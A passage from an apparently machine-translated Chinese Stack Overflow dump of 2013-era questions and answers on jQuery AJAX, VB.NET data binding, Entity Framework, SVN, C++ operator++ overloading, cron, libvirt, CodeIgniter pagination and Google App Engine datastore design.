> Fiddler 是一个 Web 调试代理，它记录您的计算机和 Internet 之间的所有 HTTP(S) 流量。Fiddler 允许您检查所有 HTTP(S) 流量、设置断点以及“摆弄”传入或传出数据。Fiddler 包括一个强大的基于事件的脚本子系统，并且可以使用任何 .NET 语言进行扩展。

这是 Fiddler 使用的视频教程：[http ://www.youtube.com/watch?v=YkJ_Wsd-rtM](http://www.youtube.com/watch?v=YkJ_Wsd-rtM)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:26:36.267

我改变了你的 html 如下

```
<html> 
    <head> 
    <title>Facility</title> 
    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.css" />
<script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
<script src="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.js"></script>
</head> 
<body> 

<div data-role="page" id="arealistpage">

  <div data-role="header" data-theme="b">
      <a href="Facility.aspx" class='ui-btn-left ui-btn-back' data-icon='arrow-l' rel="external">Back</a>
   </div><!-- /header -->

    <div data-role="content">  
  <form id="form1" method="post">
    <div id="AreaNoDiv" data-role="fieldcontain" class="field">
        <label for="Facility">Facility*</label>     
        <input id="Facility" name="shipNo_r" type="text" required/>
    </div>

     <div id="desDiv" data-role="fieldcontain" class="field">

        <label for="des" id="Label1" name="fnameLabel">Description*</label>     
        <input id="des" name="fname_r" type="text" required/>

    </div>
     <div id="submitDiv" data-role="fieldcontain" style="width: 30%">    
     <button class="btnLogin" data-theme="b" type="submit" id='mysubmit'>submit</button>
    </div>

    </form>

    </div><!-- /content -->

    <div data-role="footer" data-theme="b" data-position="fixed">

            <div data-role="navbar">
            <ul>

               <li><a href="" data-role="tab" data-icon="arrow-u" class="returnTopAction">Top</a></li>
            </ul>
        </div>
    </div>
</div><!-- /page -->
<script src="Submitscript.js" type="text/javascript"></script>
</body>
</html> 
```

和你的js如下

```
$('#arealistpage').live('pageshow',function(event){
var serviceURL = 'service1.asmx/SubmitList';
    $('#mysubmit').bind('click', function(e){
        var name = "chamara";
        e.preventDefault();
            $.ajax({
            type: "POST",
            url: serviceURL,
            data: '{"name":"' + name + '"}',
            contentType: "application/json; charset=utf-8",
            dataType: "json",
            success: successFunc,
            error: errorFunc
        });
    });

    function successFunc(data, status) {

        // parse it as object
        var outStr = JSON.parse(data.d);
        alert(outStr);
    }

    function errorFunc() {
        alert('error');
    }
}); 
```

它工作得很好。

顺便说一句，你为什么要在你的服务中序列化一个字符串。当您想将 C# 对象转换为 JSON 字符串时，序列化将很有帮助。希望它会帮助你。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-08-16T17:21:08.317

简单地使用标准按钮提交表单，为它编写点击函数，然后在完成验证后调用表单提交是否有问题？像这样简单的东西，我有一个名为“查询”的按钮

```
 $("#inquire").click(function () {
    if (validates()) {
        $("form").submit();
    } else showValidationErrors();

}); 
```

# .net - BindingSource 和父 DataRelation

> ID：15244085
> 
> 赞同：1
> 
> 时间：2013-03-06T09:58:33.530
> 
> 标签：.net, vb.net, winforms, bindingsource

我有 4 个数据表：

*   产品：pk_product、名称、fk_color、fk_size。
*   颜色：pk_color，名称。
*   大小：pk_size，名称。
*   日志：pk_log、fk_product、日期。

产品表绑定到“主”BindingSource。将日志表（子关系）绑定到主绑定就像一个魅力。但是绑定颜色和大小表（父关系）失败。

我究竟做错了什么？

```
 Dim data As New DataSet()

    With data.Tables.Add("COLOR")
        .Columns.AddRange(New DataColumn() {New DataColumn("PK_COLOR", GetType(Int32)), New DataColumn("NAME", GetType(String))})
        .PrimaryKey = New DataColumn() {.Columns(0)}
        .BeginLoadData()
        For pk_color As Integer = 1 To 5
            .Rows.Add(pk_color, String.Format("Color #{0}", pk_color))
        Next
        .EndLoadData()
        .AcceptChanges()
    End With

    With data.Tables.Add("SIZE")
        .Columns.AddRange(New DataColumn() {New DataColumn("PK_SIZE", GetType(Int32)), New DataColumn("NAME", GetType(String))})
        .PrimaryKey = New DataColumn() {.Columns(0)}
        .BeginLoadData()
        For pk_size As Integer = 6 To 10
            .Rows.Add(pk_size, String.Format("Size #{0}", pk_size))
        Next
        .EndLoadData()
        .AcceptChanges()
    End With

    With data.Tables.Add("PRODUCT")
        .Columns.AddRange(New DataColumn() {New DataColumn("PK_PRODUCT", GetType(Int32)), New DataColumn("NAME", GetType(String)), New DataColumn("FK_COLOR", GetType(Int32)), New DataColumn("FK_SIZE", GetType(Int32))})
        .PrimaryKey = New DataColumn() {.Columns(0)}
        .BeginLoadData()
        Dim pk_product As Integer = 1
        For fk_color As Integer = 1 To 5
            For fk_size As Integer = 6 To 10
                .Rows.Add(pk_product, String.Format("Product #{0}", pk_product), fk_color, fk_size)
                pk_product += 1
            Next
        Next
        .EndLoadData()
        .AcceptChanges()
    End With

    With data.Tables.Add("LOG")
        .Columns.AddRange(New DataColumn() {New DataColumn("PK_LOG", GetType(Int32)), New DataColumn("FK_PRODUCT", GetType(Int32)), New DataColumn("DATE", GetType(DateTime))})
        .PrimaryKey = New DataColumn() {.Columns(0)}
        .BeginLoadData()
        For pk_log As Integer = 1 To 15
            .Rows.Add(pk_log, pk_log, DateTime.Now().AddDays(CDbl(pk_log * -1)))
        Next
        .EndLoadData()
        .AcceptChanges()
    End With

    Dim productColorRelation As DataRelation = data.Relations.Add("PRODUCT_FK_COLOR", data.Tables("COLOR").Columns("PK_COLOR"), data.Tables("PRODUCT").Columns("FK_COLOR"))
    Dim productSizeRelation As DataRelation = data.Relations.Add("PRODUCT_FK_SIZE", data.Tables("SIZE").Columns("PK_SIZE"), data.Tables("PRODUCT").Columns("FK_SIZE"))
    Dim logProductRelation As DataRelation = data.Relations.Add("LOG_FK_PRODUCT", data.Tables("PRODUCT").Columns("PK_PRODUCT"), data.Tables("LOG").Columns("FK_PRODUCT"))

    data.AcceptChanges()

    'Master binding:
    Dim productBinding As BindingSource = New BindingSource(data, "PRODUCT")

    'Parent bindings: (Do NOT work)
    Dim productColorBinding As BindingSource = New BindingSource(productBinding, productColorRelation.RelationName)
    Dim productSizeBinding As BindingSource = New BindingSource(productBinding, productSizeRelation.RelationName)

    'Child binding:
    Dim logProductBinding As BindingSource = New BindingSource(productBinding, logProductRelation.RelationName) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-02-26T16:49:40.900

如果您只需要颜色和大小的关系来显示相关数据，您可以尝试反转这些关系并禁用检查约束。像这样定义关系：

```
Dim productColorRelation As DataRelation = data.Relations.Add("PRODUCT_FK_COLOR",  data.Tables("PRODUCT").Columns("FK_COLOR"),data.Tables("COLOR").Columns("PK_COLOR"),false)
Dim productSizeRelation As DataRelation = data.Relations.Add("PRODUCT_FK_SIZE", data.Tables("PRODUCT").Columns("FK_SIZE"), data.Tables("SIZE").Columns("PK_SIZE"), false)

'Parent bindings: (This should work with the reverse relations)
Dim productColorBinding As BindingSource = New BindingSource(productBinding, productColorRelation.RelationName)
Dim productSizeBinding As BindingSource = New BindingSource(productBinding, productSizeRelation.RelationName) 
```

祝你好运！

# entity-framework - 在实体框架中添加或更新，复杂的反序列化对象

> ID：15244086
> 
> 赞同：0
> 
> 时间：2013-03-06T09:58:37.753
> 
> 标签：entity-framework, asp.net-mvc-4, entity-framework-4, asp.net-web-api

我们正在使用 MVC 4 中的实体框架创建一个 WebAPI。我们的客户想要发送包含相关对象的复杂对象 - 新的和更新的。根对象也可能是新的或现有的。客户端生成主键 - 我们为此使用 Guids。所以在服务器上，我们真的无法判断我们得到了一个现有的对象更新还是一个新的。处理这种情况的最佳方法是什么？我们需要某种添加或更新功能，我们还不清楚如何为此使用实体框架。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T11:17:21.977

[EF 没有任何内置支持发现分离对象图中的变化](https://stackoverflow.com/questions/3635071/update-relationships-when-saving-changes-of-ef4-poco-objects/3635326#3635326)。您要么必须在每个对象中包含一些字段，以描述对象是新的、未修改的、更新的还是删除的（您还需要类似的行为来跟踪多对多关系中的更改）。如果您不使用此类字段，则除了查询数据库并将当前数据库状态与从客户端接收到的数据进行比较以查找已更改的内容之外别无他法。

# svn - subversion (1.7) 提交合并文件，包括mergeinfo但保留其他修改文件

> ID：15244088
> 
> 赞同：0
> 
> 时间：2013-03-06T09:58:39.503
> 
> 标签：svn

在将一些更改从一个分支合并到另一个分支后，我修改了以下文件

```
M      .
M      modifiedDueToMerge
M      modifiedByMe 
```

我只想提交来自合并的内容，换句话说，在我提交后仍应修改“modifiedByMe”。

我打算尝试使用更改列表，例如

```
svn changelist merged .
svn changelist merged modifiedDueToMerge 
```

但它不带“。” 从更改列表获取状态时，我只看到“modifiedByMe”文件。

在目标分支中不包含已修改文件的情况下进行合并 + 提交的推荐方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T10:42:07.907

我建议检查你的分支的第二个干净副本，在那里进行合并，然后提交。我不确定您是否小心，但您的合并可能会影响您首先修改的文件，现在包含来自合并的更改，以及来自您的更改。为了确定，我会在您的工作副本版本和每个受影响文件的基本版本之间做一个完整的`Check for modifications`并做一个差异。

您可能能够使用`TortoiseSVN`'s log 并选择修订范围来确定合并将修改哪些文件，然后从结帐中提交这些特定文件。这不是 100% 准确的，所以我仍然会按照我上面的建议去做。

最后，我认为提交`svn:mergeinfo`除分支根以外的任何内容都是一个坏主意。我被咬的次数超过了文件和子文件夹上的 mergeinfo 所能计算的次数，所以我编写了一个工具来`svn:mergeinfo`在提交合并之前从它们中删除它们。请在 SO 上查看[此答案以获取详细信息。](https://stackoverflow.com/questions/767418/remove-unnecessary-svnmergeinfo-properties/2648969#2648969)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T10:24:24.450

在[提交仅在 repo 的根目录上的属性更改之后，](https://stackoverflow.com/questions/2224814/commit-only-property-changes-on-root-of-repo-not-files)我发现下面的文件没有问题：

```
svn commit --depth empty -m "comment about the commit" . modifiedDueToMerge 
```

# javascript - 如何只运行一次灯箱？

> ID：15244089
> 
> 赞同：0
> 
> 时间：2013-03-06T09:58:44.600
> 
> 标签：javascript, html, lightbox

我创建了一个灯箱，每次我们点击网站主页时都会弹出，但我想在用户点击主页时显示一次，而不是每次点击主页时都显示。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:37:57.667

你可以使用`localStorage`or `cookies`。测试用户是否尚未访问您的页面（`visited`在这种情况下通过获取 -key）> 打开您的灯箱并设置`visited`密钥。现在每次用户打开您的页面时`visited`-key 不是 false 并且您的灯箱将不会打开：

```
if( !window.localStorage.getItem("visited") ){
    alert(true);
    window.localStorage.setItem("visited", true);
} 
```

[http://fiddle.jshell.net/UsfAh/](http://fiddle.jshell.net/UsfAh/)

正如提问者（在[评论](https://stackoverflow.com/questions/15244089/how-to-run-light-box-only-once/15244999?noredirect=1#comment21497075_15244999)中）所问的那样，这对他来说可能是一个更好的解决方案：

```
window.onunload = function(){
    window.localStorage.setItem("visited", true);
}; 
```

# javascript - 从 JavaScript 中的变量传递数据

> ID：15244092
> 
> 赞同：1
> 
> 时间：2013-03-06T09:58:48.243
> 
> 标签：javascript, jquery

我创建了一个带有以下函数的小型 JavaScript 应用程序，该函数调用一个函数来检索 JSON 数据：

```
var months = function getMonths(){

$.getJSON("app/data/Cars/12Months", function (some_data) {
    if (some_data == null) {
        return false;
    }

    var months_data = new Array();
    var value_data = new Array();

    $.each(some_data, function(index, value) {
        months_data.push(index);
        value_data.push(value);
   });

    return[months_data,value_data];
}); 
```

}

然后，我在同一个文件中创建了另一个在加载特定页面时执行某些操作的函数。在这个函数中，变量“months”被传递给变量“result”。

```
$(document).on('pageshow', '#chartCar', function(){

$(document).ready(function() {

    var result = months;
    var date = result[0];
    var values = result[1];

//more code here...

});
} 
```

问题是，基于调试器，getMonths() 函数工作正常并产生预期的输出，但第二个函数中的“结果”变量无法获得变量“月”传递给它的值。你知道如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:11:01.080

问题是您的`$.getJSON()`函数是异步的，因此您的数据稍后会加载，然后再读取。有两种解决方法：
1\. 将您的替换`$.getJSON`为`$.ajax`和设置`async: false`；
2\. 将您的代码放入`$.getJSON`回调中：

```
var months = function getMonths(){

$.getJSON("app/data/Cars/12Months", function (some_data) {
    if (some_data == null) {
        return false;
    }

var months_data = new Array();
var value_data = new Array();

$.each(some_data, function(index, value) {
    months_data.push(index);
    value_data.push(value);

}); 

var date = months_data;
var values = value_data;
//more code here..
    })
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:06:49.130

一定有语法错误。

**代替**

```
});
} 
```

**和**

```
});
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:14:12.483

`$.getJSON()`是一个包装器`$.ajax`，默认情况下是异步的。但是您将其视为同步调用。

您可以使用`$.ajaxSetup()`

```
$.ajaxSetup( { "async": false } );
$.getJSON(...)
$.ajaxSetup( { "async": true } ); 
```

或`$.ajax`与`async: false`

```
$.ajax({
    type: 'GET',
    url: 'app/data/Cars/12Months',
    dataType: 'json',
    async: false,
    success: function(some_data) { 
        //your code goes here
    }
}); 
```

或者如果可能的话，改变你的应用程序的行为，以便你在回调函数中处理你的数据。

# c++ - 为前后增量重载 ++

> ID：15244094
> 
> 赞同：57
> 
> 时间：2013-03-06T09:58:53.727
> 
> 标签：c++, operator-overloading

我们可以超载`operator++`前增量和后增量吗？即调用`SampleObject++`并`++SampleObject`给出正确的结果。

```
class CSample {
 public:
   int m_iValue;     // just to directly fetch inside main()
   CSample() : m_iValue(0) {}
   CSample(int val) : m_iValue(val) {}
   // Overloading ++ for Pre-Increment
   int /*CSample& */ operator++() { // can also adopt to return CSample&
      ++(*this).m_iValue;
      return m_iValue; /*(*this); */
   }

  // Overloading ++ for Post-Increment
 /* int operator++() {
        CSample temp = *this;
        ++(*this).m_iValue;
        return temp.m_iValue; /* temp; */
    } */
}; 
```

我们不能只根据返回类型重载一个函数，而且即使我们认为它是允许的，由于重载决策的模糊性，它也不能解决问题。

既然提供了运算符重载来使内置类型表现得像用户定义的类型，为什么我们不能同时为我们自己的类型使用前置和后置增量呢？

* * *

## 回答 #1

> 赞同：101
> 
> 时间：2013-03-06T10:02:44.200

增量运算符的后缀版本采用一个虚拟`int`参数来消除歧义：

```
// prefix
CSample& operator++()
{
  // implement increment logic on this instance, return reference to it.
  return *this;
}

// postfix
CSample operator++(int)
{
  CSample tmp(*this);
  operator++(); // prefix-increment this instance
  return tmp;   // return value before increment
} 
```

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2013-03-06T12:29:10.133

类型 T 的前置增量和后置增量的标准模式

```
T& T::operator++() // pre-increment, return *this by reference
{
 // perform operation

 return *this;
}

T T::operator++(int) // post-increment, return unmodified copy by value
{
     T copy(*this);
     ++(*this); // or operator++();
     return copy;
} 
```

（您也可以调用一个通用函数来执行增量，或者如果它是一个简单的单行函数，如成员上的 ++，只需在两者中都执行）

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2013-03-06T10:06:06.163

> 为什么我们不能同时为我们自己的类型使用前后增量。

你可以：

```
class CSample {
public:

     int m_iValue;
     CSample() : m_iValue(0) {}
     CSample(int val) : m_iValue(val) {}

     // Overloading ++ for Pre-Increment
     int /*CSample& */ operator++() {
        ++m_iValue;
        return m_iValue;
     }

    // Overloading ++ for Post-Increment
    int operator++(int) {
          int value = m_iValue;
          ++m_iValue;
          return value;
      }
  };

  #include <iostream>

  int main()
  {
      CSample s;
      int i = ++s;
      std::cout << i << std::endl; // Prints 1
      int j = s++;
      std::cout << j << std::endl; // Prints 1
  } 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2017-11-25T07:08:42.473

**[N4687]**

### 16.5.7

> 名为 operator++ 的用户定义函数实现了前缀和后缀 ++ 运算符。如果这个函数是一个没有参数的非静态成员函数，或者一个有一个参数的非成员函数，它为该类型的对象定义了前缀自增运算符++。如果函数是具有一个参数的非静态成员函数（应为 int 类型）或具有两个参数的非成员函数（第二个应为 int 类型），则定义后缀递增运算符 ++对于该类型的对象。当使用 ++ 运算符调用后缀增量时，int 参数的值为零

### 例子：

```
struct X {
  X&   operator++();    // prefix ++a
  X    operator++(int); // postfix a++
};

struct Y { };

Y&   operator++(Y&);      // prefix ++b
Y    operator++(Y&, int); // postfix b++

void f(X a, Y b) {
  ++a; // a.operator++();
  a++; // a.operator++(0);
  ++b; // operator++(b);
  b++; // operator++(b, 0);

  a.operator++();     // explicit call: like ++a;
  a.operator++(0);    // explicit call: like a++;
  operator++(b);      // explicit call: like   ++b;
  operator++(b, 0);   // explicit call: like b++;
} 
```

# shell - cd 到符号链接目录在 cron 环境中失败

> ID：15244095
> 
> 赞同：1
> 
> 时间：2013-03-06T09:58:54.240
> 
> 标签：shell, ubuntu, cron, environment-variables, cd

我有一台运行 Ubuntu 12.04 的服务器，我们用它来托管 Rails 应用程序。我在 cron 上运行一个任务，它由几个用`&&`- 分隔的 unix 命令组成，例如：

```
cd /home/deploy/app/current && RAILS_ENV=production ... 
```

最后一点已被剪断，因为命令在第一个失败`cd`，这是：

> cd：没有这样的文件或目录

在*部署*用户的环境中， cd 可以正常工作。该目录存在，它是一个符号链接：

```
lrwxrwxrwx 1 deploy deploy 42 Mar  4 15:28 /home/deploy/app/current -> /home/deploy/app/releases/20130304152305 
```

我觉得很奇怪，shell cd 到符号链接的能力会受到环境的影响，所以我把 cron 的环境变量吐到一个文件中，根据这个问题：[如何模拟环境 cron 执行脚本和？](https://stackoverflow.com/questions/2135478/how-to-simulate-the-environment-cron-executes-a-script-with).

如果我尝试以 cron 用户身份执行该行，则会失败：

```
$ env - $(cat ~/cron.env) cd /home/deploy/app/current
env: cd: No such file or directory 
```

为什么会这样？cron 的环境变量是：

```
HOME=/home/deploy
LOGNAME=deploy
PATH=/usr/bin:/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/home/deploy 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T14:45:53.247

`cd`是一个内置的shell，而不是一个程序，所以既`cron`不能`env`也不能直接执行它。以下内容应该适用于您的 cron 作业：

```
sh -c "cd /home/deploy/app/current && RAILS_ENV=production ..." 
```

# java - 从 .xml 文件创建 .img 文件以使用 libvirt api 和 java 在 ubuntu 中创建 kvm

> ID：15244096
> 
> 赞同：1
> 
> 时间：2013-03-06T09:58:57.240
> 
> 标签：java, xml, kvm, libvirt

我正在尝试使用 java 的 libvirt api 创建一个 kvm。我面临的问题是我需要一个设备（图像文件（例如：kvm.img））。我正在使用 .xml 文件使用 libvirt api 和 java 创建 kvm。现在我正在做的是首先使用从终端创建的 qemu-img 创建 .img 文件。`qemu-img create /var/lib/libvirt/images/kvm.img 10G`是我正在使用的代码并在 xml 中创建我提到的 kvm`<source file='var/lib/libvirt/images/kvm.img'/>`

现在我需要知道 libvirt api 中是否有任何方法可以通过 xml 文件创建 .img 文件，并且我也需要了解 xml 文件（创建 img 文件）

我正在使用 libvirt 1.0

我用来创建 kvm 的 xml 文件是： `<domain type='kvm'><name>ft</name><memory>131072</memory><currentMemory>131072</currentMemory><vcpu>1</vcpu><os><type arch='x86_64' machine='pc-0.12'>hvm</type><boot dev='hd'/></os><features><acpi/></features> <clock offset='utc'/> <on_poweroff>destroy</on_poweroff><on_reboot>restart</on_reboot><on_crash>destroy</on_crash> <devices><emulator>/usr/bin/kvm</emulator><disk type='file' device='disk'><source file='var/lib/libvirt/images/ft.img'/><target dev='hda' bus='ide'/></disk><interface type='network'><mac address='52:54:00:8b:08:dd'/><source network='default'/><model type='virtio'/></interface><input type='mouse' bus='ps2'/><graphics type='vnc' port='-1' autoport='yes' listen='127.0.0.1'/><video><model type='cirrus' vram='9216' heads='1'/> </video></devices></domain>`

在java中我使用libvirt方法，`Domain createVm = con.domainCreateXML(str, 0);` 因为`str`我正在传递xml字符串

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-07T14:36:06.897

镜像文件的创建是在 libvirt API 之外的，因为关心实际磁盘设备的是 qemu。从技术上讲，VM 磁盘设备可以是像 *.img 这样的原始映像文件，或者像映射的 iscsi 目标这样的循环设备或存储设备，而 libvirt 不知道它来自哪里。

因此，您需要自己处理 VM 磁盘文件的创建。两者`qemu-img`兼而有之`dd`。请参阅此[问题](https://stackoverflow.com/questions/15544386/how-to-run-linux-program-from-java-code)的答案。如果你只想为 KVM VM 创建原始文件，实际上你只需要通过 Java File API创建一个**稀疏文件。**请参阅[在 Java 中创建具有给定大小的文件的](https://stackoverflow.com/questions/245251/create-file-with-given-size-in-java)问题，它的工作与所做的完全相同`qemu-img create`。

# c# - 在字典中添加字符

> ID：15244097
> 
> 赞同：0
> 
> 时间：2013-03-06T09:59:03.057
> 
> 标签：c#

在我的程序中，我有一段代码在字典中添加字符

```
 var listOfSimilarCharacters = new Dictionary<string, string>();
 listOfSimilarCharacters.Add("l", "!");
 listOfSimilarCharacters.Add("1", "i");
 listOfSimilarCharacters.Add("O", "0");
 listOfSimilarCharacters.Add("o", "I"); 
```

但是在我的代码上面我有一个属性“SimilarCharacters”我需要重新删除它并删除`listOfSimilarCharacters.Add`四行

```
/// <summary>
/// A constant that is lists all similar characters.
/// </summary>
public const string SimilarCharacters = "l!1iO0oI"; 
```

在某种程度上，我需要从`SimilarCharacters`字典中添加字符并读`SimilarCharacters`出，这样我就可以使用它而不是四行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:06:40.813

```
 string SimilarCharacters = "l!1iO0oI";

        var listOfSimilarCharacters = new Dictionary<string, string>();

        bool timeToAdd = false;
        string key = String.Empty;
        string value = String.Empty;
        foreach ( var c in SimilarCharacters )
        {
            if ( timeToAdd )
            {
                value = c.ToString();
                listOfSimilarCharacters.Add( key, value );
            }
            else
            {
                key = c.ToString();
            }
            timeToAdd = !timeToAdd;
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:04:23.347

您可以使用集合初始化程序来填充您的字典：

```
var listOfSimilarCharacters = new Dictionary<string, string> { 
  { "l", "!" }, { "1", "i" }, {"O", "0"}, {"o", "I"} 
}; 
```

顺便说一句，你为什么使用字符串来存储字符？

# php - 分页不起作用未解决的错误

> ID：15244099
> 
> 赞同：0
> 
> 时间：2013-03-06T09:59:06.603
> 
> 标签：php, codeigniter, pagination

大家好，我正在尝试在 Web 项目中构建分页功能，我将 codeigniter 上的用户指南和 net tuts 上的教程放在这里是链接`http://net.tutsplus.com/tutorials/php/codeigniter-from-scratch-day-7-pagination/` ，但我不断收到这些错误：

```
A PHP Error was encountered

Severity: Notice

Message: Undefined property: CI_Loader::$pagination

Filename: views/result_view.php

Line Number: 41 
```

和

```
 Fatal error: Call to a member function create_links() on a non-object in C 
```

无法弄清楚这些错误来自哪里，我该如何解决它们可以有人帮助我这里是我的 cmv：

**控制器**

```
<?php

class Result_controller extends CI_Controller{

    function getall(){

        $this->load->model('result_model');
        $data['query'] = $this->result_model->result_getall();
       // print_r($data['query']); die();
        $this->load->view('result_view', $data);

        }

        function pagination()
        {

            $this->load->library('pagination');

            $config['base_url'] = 'result_controller/pagination';
        $config['total_rows'] = $this->db->get('data')->num_rows();
        $config['per_page'] = 5;
        $config['num_links'] = 3;
        $config['full_tag_open'] = '<div id="pagination">';
        $config['full_tag_close'] = '</div>';

        $this->pagination->initialize($config);

        $data['records'] = $this->db->get('data', $config['per_page'], $this->uri->segment(3));

        $this->load->view('result_view', $data);

        } 
```

**看法**

```
 <table border="1">

  <tr>
     <th>Name</th>
     <th>Second Name</th>
     <th>Phone</th>
     <th>Email</th>
     <th>Answer</th>
     <th>Comment</th>
 </tr>
  <?php foreach ($query as $row): ?> 
 <tr>

     <td><?php echo $row->name; ?></td>
     <td><?php echo $row->second_name; ?></td>
     <td><?php echo $row->phone; ?></td>
     <td><?php echo $row->email; ?></td>
      <td> <?php echo $row->answerA;?>
      <?php echo $row->answerB;?>
      <?php echo $row->answerC;?></td>
     <td><?php echo $row->comment;?><br></td>

 </tr>

      <?php endforeach; ?>

     </table>  
     <?php echo $this->pagination->create_links(); ?> 
```

**模型**

```
<?php

class Result_model extends CI_Model{

    function result_getall(){

         return $this->db->select('*')
                         ->from('tblanswers, credentials')
                         ->get()
                         ->result_object();

    }

}

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:08:03.063

从您的视图中删除此行

```
<?php echo $this->pagination->create_links(); ?> 
```

并粘贴这个

```
<?php echo $pagination ?> 
```

**编辑**

将分页代码放在 getall() 函数中，而不是使用分页函数，如下所示：

```
class Result_controller extends CI_Controller{

    function getall(){

        $this->load->model('result_model');
        $data['query'] = $this->result_model->result_getall();
        // print_r($data['query']); die();

        $this->load->library('pagination');

        $config['base_url'] = 'result_controller/getall';
        $config['total_rows'] = $this->db->get('data')->num_rows();
        $config['per_page'] = 5;
        $config['num_links'] = 3;
        $config['full_tag_open'] = '<div id="pagination">';
        $config['full_tag_close'] = '</div>';

        $this->pagination->initialize($config);
        $data['pagination'] = $this->pagination->create_links();
        $data['records'] = $this->db->get('data', $config['per_page'], $this->uri->segment(3));
        $this->load->view('result_view', $data);

        } 
```

}

# google-app-engine - 如何布局 GAE 数据存储

> ID：15244101
> 
> 赞同：0
> 
> 时间：2013-03-06T09:59:12.113
> 
> 标签：google-app-engine, google-cloud-datastore

## 介绍

我是 GAE 的新手，写了一个小应用程序，不幸的是，尽管数据存储区中的数据不多，但它很快就达到了数据存储区每天读取的配额限制。
这个问题应该是关于布局和索引的可能使用（目前我对如何使用它们没有任何线索）。

## 应用程序应该做什么

*   该应用程序应该记录纸牌游戏的分数（感兴趣的人可以使用[Tichu](http://en.wikipedia.org/wiki/Tichu) ^^）。一场比赛由几轮组成，当一支球队达到 1000 分时结束。
*   该应用程序应显示已玩游戏的统计信息

### 应用程序的第一个布局

我的第一个布局方法是使用以下实体：

```
class Player(db.Model):
    Name = db.StringProperty(required = True)

class Game(db.Model):
    Players = db.ListProperty(db.Key)
    Start = db.DateTimeProperty(auto_now_add = True, required = True)
    End = db.DateTimeProperty()

class Round(db.Model):
    Game = db.Reference(Game, required = True)
    RoundNumber = db.IntegerProperty(required = True)
    PointsTeamA = db.IntegerProperty(required = True)
    PointsTeamB = db.IntegerProperty(required = True)
    FinishedFirst = db.ReferenceProperty(Player, required = True)
    TichuCalls = db.ListProperty(db.Key) 
```

正如您在上面看到的，实体已标准化（至少我希望它们是标准化的）。但是，使用这种方法可以进行简单的计算，例如

*   什么球员赢得了最多的比赛

这可能看起来像这样

```
#Untested snippet just to get an idea of what I am doing here
Wins = dict.fromkeys(Player.all().fetch(None), 0)
for r in Round.all():
    wins[r.FinishedFirst] += 1 
```

但还有其他统计数据，如

*   哪个玩家最常先完成
*   哪个玩家的胜率最高
*   等等

产生非常大量的数据集读取操作。在仅显示有限数量统计数据的页面上，仅通过几次刷新就达到了一天的配额，只有 60 轮和满手的游戏。此外，使用 memcache 并没有解决这里的问题。
这导致了我的第二种方法：

### 应用程序的第二个布局

```
class Player(db.Model):
    Name = db.StringProperty(required = True)

class Game(db.Model):
    Players = db.ListProperty(db.Key)
    Start = db.DateTimeProperty(auto_now_add = True, required = True)
    End = db.DateTimeProperty()
    Rounds = db.BlobProperty()

    def GetRounds(self):
        if self.Rounds:
            return pickle.loads(self.Rounds)
        else:
            return []

    def AddRound(self, R):
        Rounds = self.GetRounds()
        Rounds.append(R)
        self.Rounds = pickle.dumps(Rounds, -1)

class Round(object):
    def __init__(self, Game, RoundNumber, PointsTeamA, PointsTeamB, FinishedFirst, TichuCalls):
        self.Game = Game
        self.RoundNumber = RoundNumber
        self.PointsTeamA = PointsTeamA
        self.PointsTeamB = PointsTeamB
        self.FinishedFirst = FinishedFirst
        self.TichuCalls = TichuCalls 
```

现在每个都`Game`存储一个不再是`db.Model`. 这大大减少了数据集读取量。

## 问题

1.  您将如何设置数据模型？`BlobProperty`（使用非 type 的存储对象有意义`db.Model`吗？）
2.  该模型的索引如何？（请详细说明，因为我对索引的了解非常有限。）
3.  随着数据存储中元素数量的增加，第二个方法最终也将达到每天读取的配额。在设计模型时，您将如何考虑这一事实？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T13:35:28.013

简短的回答 - 习惯于不“规范化”您的数据。这就是 NoSQL DBS 的美妙之处。我会在 Player 模型中添加一个列表属性或一堆整数属性（以您的应用程序更有意义的为准），跟踪他们的游戏完成情况。像这样：

```
class Player(db.Model):
    Name = db.StringProperty(required = True)
    FinishedFirst = db.IntegerProperty(default=0)
    FinishedSecond = db.IntegerProperty(default=0)
    ... 
```

或者

```
class Player(db.Model):
    Name = db.StringProperty(required = True)
    Finishes = db.ListProperty() # A list of 1s, 2s, 3s, etc... for each finish 
```

关键是这两个都将帮助您避免查询/使用更多资源，然后以编程方式尝试找出用户首先完成了多少次。

当您知道您将使用 A LOT 的数据时，请考虑将冗余属性存储在主模型中，以便它始终触手可及，而无需重新查询。

此外，请查看 NDB API [https://developers.google.com/appengine/docs/python/ndb/properties](https://developers.google.com/appengine/docs/python/ndb/properties) 您可以在游戏回合中利用 JsonProperty。

归根结底，规范化是老式的 RDB 东西。

# c# - 是否可以使用报表查看器中动态生成的数据集？

> ID：15244102
> 
> 赞同：0
> 
> 时间：2013-03-06T09:59:12.370
> 
> 标签：c#, visual-studio-2010, desktop-application

我是 Windows 桌面应用程序开发的新手。

我想在我的应用程序中打印账单，我使用了报表查看器控件并放置了两个标签来显示账单编号和当事人名称。

我正在 C# 中的代码隐藏文件中创建数据集。

我将数据集单元格的值分配给标签的文本属性。我的代码是：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
